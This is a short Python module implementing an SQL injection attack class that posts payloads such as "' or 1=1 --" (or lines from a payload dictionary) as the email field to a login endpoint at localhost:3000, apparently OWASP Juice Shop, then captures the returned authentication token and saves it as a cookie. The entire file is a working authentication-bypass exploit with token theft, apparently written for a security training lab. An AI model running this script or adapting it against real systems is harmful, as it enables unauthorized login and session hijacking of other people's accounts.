from . import attack as a

class SQL_injector(a.attack_inter):
    def __init__(self, dictionary=None):
        self.dictionary = dictionary
        # First trying to load cookies from local cookie file
        self.juice_session = a.requests.session()
        #self.juice_session.cookies = a.cookielib.LWPCookieJar(filename="./juiceShopCookies.txt")

    def generator(self, myScript='\' or 1=1 --'):
        #cookies = COOKIE
        headers = a.HEADER

        json_data = {
            'email': myScript,
            'password': '123',
        }

        return headers, json_data

    def run(self):
        if self.dictionary:
            f = open(self.dictionary, "r")
            for line in f:
                line = line.rstrip()
                headers, json_data = self.generator(line)
                response = self.juice_session.post('http://localhost:3000/rest/user/login', json=json_data, verify=False)
                if response.status_code == 200:
                    res_payload_dict = response.json()
                    print("Valid script: ", json_data['email'])
                    print(res_payload_dict)
                    #self.juice_session.cookies.save()
                    break
        else:
            headers, json_data = self.generator()
            response = self.juice_session.post('http://localhost:3000/rest/user/login', json=json_data)
            if response.status_code == 200:
                res_payload_dict = response.json()
                print("Valid script: ", json_data['email'])
                print(res_payload_dict)
                
                new_token = res_payload_dict["authentication"]['token']
                print(new_token)

                new_cookie = a.COOKIE
                new_cookie["token"] = new_token
                a.write_cookie(new_cookie)